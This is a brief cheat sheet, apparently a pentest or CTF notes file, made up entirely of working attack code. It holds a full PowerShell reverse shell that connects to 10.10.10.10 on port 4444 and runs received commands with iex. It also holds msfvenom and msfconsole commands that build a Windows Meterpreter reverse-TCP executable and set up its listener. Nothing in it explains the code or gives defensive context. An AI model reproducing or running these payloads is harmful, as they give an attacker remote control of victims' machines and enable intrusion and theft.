# Reverse Shell
```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

# MSFVENOM Windows 
```powershell
msfvenom -p windows/x64/meterpreter_reverse_tcp \
  LHOST=<SƏNİN_IP_ÜNVANIN> \
  LPORT=4444 \
  -f exe \
  -o reverse_x64.exe

msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 10.10.15.45
set LPORT 4444
exploit
```
